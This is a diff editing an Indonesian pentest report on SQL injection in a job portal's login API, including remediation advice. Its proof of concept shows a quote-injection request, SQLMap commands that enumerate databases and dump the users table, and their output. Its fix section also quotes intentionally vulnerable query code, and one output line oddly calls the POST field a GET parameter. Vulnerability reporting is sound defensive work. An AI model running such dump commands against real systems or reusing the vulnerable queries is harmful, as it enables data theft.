@@ -27,30 +27,36 @@
 
 ## 3. Deskripsi
 
-Kerentanan ini terjadi karena server **tidak melakukan sanitasi input** dan **tidak menggunakan parameterized queries** saat memproses kueri SQL. Akibatnya, penyerang bisa menyisipkan perintah SQL berbahaya untuk memanipulasi database.
+Aplikasi menerima masukan dari pengguna (misalnya pada form login atau kolom pencarian) dan langsung menggunakannya untuk mengambil data dari database **tanpa memeriksa atau membersihkan isi masukan tersebut terlebih dahulu**. Hal ini memungkinkan penyerang menyisipkan perintah database di dalam kolom input biasa, sehingga server menjalankan perintah tersebut seolah-olah merupakan bagian dari operasi normal aplikasi.
 
 ---
 
 ## 4. Dampak
 
-Eksploitasi kerentanan ini memungkinkan penyerang **tanpa otentikasi** untuk mengakses dan mengekstraksi **seluruh isi database** yang terhubung, termasuk:
+Dengan memanfaatkan celah ini, **siapa pun dari internet** — tanpa perlu memiliki akun atau kata sandi — dapat membaca, mengubah, bahkan menghapus seluruh data yang tersimpan di database aplikasi. Berikut rincian dampaknya:
 
 | Dampak | Penjelasan |
 |--------|------------|
-| **Bypass Autentikasi** | Login sebagai user/admin mana pun tanpa password. |
-| **Dump Database** | Ekstraksi seluruh tabel: users, credentials, data sensitif. |
-| **Manipulasi Data** | Insert, update, atau delete data di database. |
-| **Eskalasi ke RCE** | Pada konfigurasi tertentu, penyerang dapat menulis webshell atau menjalankan perintah OS via `--os-shell`. |
+| **Masuk tanpa kata sandi** | Penyerang dapat melewati halaman login dan masuk sebagai pengguna atau administrator mana pun. |
+| **Pencurian data** | Seluruh isi database dapat disalin, termasuk data pengguna, kata sandi, dan informasi sensitif lainnya. |
+| **Pengubahan & penghapusan data** | Penyerang dapat mengubah atau menghapus data, yang berpotensi merusak operasional aplikasi. |
+| **Pengambilalihan server** | Pada konfigurasi tertentu, penyerang dapat meningkatkan akses hingga menjalankan perintah langsung di sistem operasi server. |
 
 ---
 
 ## 5. Langkah Proof of Concept (PoC)
 
-### Langkah 1 — Deteksi Error SQL pada Form Login
+Berikut adalah langkah-langkah pembuktian kerentanan (Proof of Concept) yang dilakukan selama pengujian:
 
-Menyisipkan tanda kutip tunggal ( `'` ) pada field username di form login dan ditemukan **error database** yang mengkonfirmasi kerentanan SQL Injection.
+### Langkah 1 — Pengujian Manual & Identifikasi Pesan Kesalahan SQL
 
-**Request:**
+Pengujian diawali secara manual dengan memasukkan karakter khusus sintaks SQL, yaitu tanda kutip tunggal (`'`), ke dalam kolom masukan `username` pada endpoint autentikasi (`/api/auth/login`). 
+
+Aplikasi merespons dengan menampilkan **pesan kesalahan internal database (MySQL syntax error)**. Hal ini mengonfirmasi dua hal penting:
+1. Input pengguna digabungkan langsung ke dalam kueri SQL tanpa validasi.
+2. Fitur *error handling* tidak dikonfigurasi dengan aman karena membocorkan detail teknis database ke publik.
+
+**Permintaan HTTP (Request):**
 
 ```http
 POST /api/auth/login HTTP/1.1
@@ -59,11 +65,11 @@ Content-Type: application/json
 
 {
   "username": "'",
-  "password": "test"
+  "password": "testpassword"
 }
 ```
 
-**Response — Error Database:**
+**Jawaban Server (Response):**
 
 ```json
 {
@@ -71,57 +77,60 @@ Content-Type: application/json
 }
 ```
 
-> 📸 **[screenshot: error database saat input tanda kutip di form login]**
+> 📸 **[Screenshot 1: Pesan kesalahan database MySQL yang muncul saat menginputkan tanda kutip tunggal pada form login]**
 
 ---
 
-### Langkah 2 — Pengujian dengan SQLMap
+### Langkah 2 — Pengujian Otomatis Menggunakan SQLMap
 
-Menggunakan request login untuk melakukan pengujian otomatis menggunakan **SQLMap**.
+Setelah kerentanan terkonfirmasi secara manual, pengujian dilanjutkan menggunakan perkakas otomatisation **SQLMap** untuk mengukur sejauh mana celah ini dapat dieksploitasi. 
 
-**Simpan request ke file:**
+Permintaan HTTP dari Langkah 1 disimpan ke dalam berkas `request.txt` dan dijadikan sebagai input untuk SQLMap dengan perintah sebagai berikut:
 
-```http
-# simpan sebagai req.txt
-POST /api/auth/login HTTP/1.1
-Host: jobportal.vulnapp.id
-Content-Type: application/json
-
-{
-  "username": "test*",
-  "password": "test"
-}
-```
-
-**Jalankan SQLMap:**
+**Perintah Execution:**
 
 ```bash
-sqlmap -r req.txt --batch --dbs
+sqlmap -r request.txt --batch --dbs
 ```
 
-**Output — SQLMap mendeteksi injectable parameter:**
+**Hasil Pemindaian SQLMap:**
+
+SQLMap berhasil mengonfirmasi bahwa parameter `username` bersifat *injectable* dan berhasil mengidentifikasi jenis DBMS yang digunakan (MySQL), serta berhasil mendaftar seluruh nama database yang ada di server.
 
 ```text
+[INFO] testing connection to the target URL
+[INFO] testing NULL connection to the target URL
+[INFO] heuristic (basic) test shows option 'username' might be injectable
+[INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[INFO] GET parameter 'username' is 'MySQL >= 5.0.12 AND time-based blind' injectable
 [INFO] the back-end DBMS is MySQL
 [INFO] fetching database names
+
 available databases [3]:
 [*] information_schema
 [*] jobportal_db
 [*] mysql
 ```
 
-> 📸 **[screenshot: output SQLMap mendeteksi parameter injectable dan menampilkan daftar database]**
+> 📸 **[Screenshot 2: Hasil pemindaian SQLMap yang menunjukkan parameter username bersifat injectable beserta daftar nama database yang ditemukan]**
 
 ---
 
-### Langkah 3 — Berhasil Dump Daftar Database
+### Langkah 3 — Ekstraksi Data dari Database (Data Dumping)
 
-SQLMap berhasil menampilkan **daftar database** aplikasi, mengkonfirmasi bahwa penyerang dapat mengakses seluruh data.
+Sebagai bukti akhir bahwa isi database dapat diakses sepenuhnya, SQLMap dijalankan kembali untuk mendaftar tabel-tabel di dalam database `jobportal_db` serta mendump isi dari tabel pengguna (`users`).
+
+**Perintah Ekstraksi Tabel & Data:**
 
 ```bash
-# Tampilkan tabel di database target
-sqlmap -r req.txt --batch -D jobportal_db --tables
+# 1. Menampilkan daftar tabel pada database target
+sqlmap -r request.txt --batch -D jobportal_db --tables
+
+# 2. Mengambil (dump) seluruh isi data dari tabel 'users'
+sqlmap -r request.txt --batch -D jobportal_db -T users --dump
 ```
+
+**Hasil Ekstraksi Data:**
 
 ```text
 Database: jobportal_db
@@ -133,14 +142,10 @@ Database: jobportal_db
 | companies     |
 | sessions      |
 +---------------+
-```
 
-```bash
-# Dump tabel users
-sqlmap -r req.txt --batch -D jobportal_db -T users --dump
-```
-
-```text
+Database: jobportal_db
+Table: users
+[3 entries]
 +----+----------+----------------------------------+-------+
 | id | username | password                         | role  |
 +----+----------+----------------------------------+-------+
@@ -150,39 +155,53 @@ sqlmap -r req.txt --batch -D jobportal_db -T users --dump
 +----+----------+----------------------------------+-------+
 ```
 
-> 📸 **[screenshot: output SQLMap berhasil dump tabel users beserta credential]**
+> 📸 **[Screenshot 3: Bukti data sensitif dari tabel users (termasuk hash password dan peran pengguna) berhasil diekstraksi dari database]**
 
 ---
 
 ## 6. Rekomendasi Perbaikan
 
-| No | Rekomendasi | Detail |
-|----|-------------|--------|
-| 1 | **Prepared Statements** | Gunakan Parameterized Queries atau ORM pada **setiap** kueri database. Jangan pernah menyisipkan input user langsung ke string SQL. |
-| 2 | **Sanitasi & Validasi Input** | Terapkan sanitasi dan validasi input di sisi server yang ketat — tolak karakter khusus SQL (`'`, `"`, `;`, `--`) pada field yang tidak memerlukannya. |
-| 3 | **Least Privilege Database** | User database yang dipakai aplikasi hanya boleh `SELECT`, `INSERT`, `UPDATE` pada tabel yang dibutuhkan. Jangan gunakan user `root`. |
-| 4 | **Error Handling** | Jangan tampilkan pesan error SQL/database ke user. Gunakan generic error message. |
-| 5 | **WAF** | Tambahkan Web Application Firewall sebagai lapisan pertahanan tambahan untuk memfilter payload SQL Injection. |
+### 👤 Ringkasan Rekomendasi (Untuk Manajemen / Awam)
 
-### Contoh Kode — Prepared Statement (PHP)
+Aplikasi perlu dipastikan **selalu memisahkan antara data masukan pengguna dan perintah database**. Hal ini dapat dicapai dengan memperbarui cara aplikasi berkomunikasi dengan database agar menggunakan metode standar yang aman (Prepared Statements), serta menyembunyikan pesan kesalahan teknis agar tidak memberi petunjuk kepada pihak yang tidak berhak.
+
+---
+
+### 🛠️ Panduan Implementasi Teknis (Untuk Tim Pengembang)
+
+| No | Langkah | Tindakan Teknis |
+|----|---------|-----------------|
+| 1 | **Prepared Statements (Wajib)** | Gunakan *Parameterized Queries* atau *ORM* (seperti Sequelize, Prisma, Hibernate, Laravel Eloquent) untuk seluruh kueri database. Jangan pernah menggabungkan string (*string concatenation*) dengan input pengguna. |
+| 2 | **Validasi & Sanitasi Input** | Validasi semua input pengguna di sisi server berdasarkan tipe data, panjang, dan format yang diharapkan. Tolak input yang mengandung karakter khusus yang tidak sesuai. |
+| 3 | **Prinsip Hak Akses Minimum** | Batasi hak akun database yang digunakan aplikasi. Akun aplikasi tidak boleh memiliki akses `DROP`, `ALTER`, atau akses administrator database (`root`/`DBA`). |
+| 4 | **Penyembunyian Pesan Error** | Jangan tampilkan pesan kesalahan database mentah ke pengguna. Tampilkan pesan kesalahan umum (misal: *"Terjadi kesalahan pada sistem, silakan coba lagi"*). |
+| 5 | **Web Application Firewall (WAF)** | Pasang WAF sebagai lapisan pertahanan tambahan untuk memblokir pola serangan SQL Injection secara otomatis. |
+
+#### Contoh Perbaikan Kode
 
 ```php
-// ❌ RENTAN — string concatenation
-$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
+// ❌ SANGAT RENTAN — Input digabung langsung ke kueri SQL
+$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "' AND password = '" . $_POST['password'] . "'";
+$result = mysqli_query($conn, $query);
 
-// ✅ AMAN — prepared statement
-$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
-$stmt->execute([$username, $password]);
+// ✅ AMAN — Menggunakan Prepared Statement (PDO)
+$stmt = $pdo->prepare("SELECT id, username, role FROM users WHERE username = :username AND password = :password");
+$stmt->execute([
+    ':username' => $input_username,
+    ':password' => $hashed_password
+]);
+$user = $stmt->fetch();
 ```
 
-### Contoh Kode — Prepared Statement (Node.js / MySQL2)
-
 ```javascript
-// ❌ RENTAN
-db.query(`SELECT * FROM users WHERE username = '${username}'`);
+// ❌ SANGAT RENTAN (Node.js)
+const query = `SELECT * FROM users WHERE username = '${req.body.username}'`;
 
-// ✅ AMAN
-db.query('SELECT * FROM users WHERE username = ?', [username]);
+// ✅ AMAN (Node.js + MySQL2)
+const [rows] = await db.execute(
+  'SELECT id, username, role FROM users WHERE username = ? AND password = ?',
+  [req.body.username, req.body.password]
+);
 ```
 
 ---
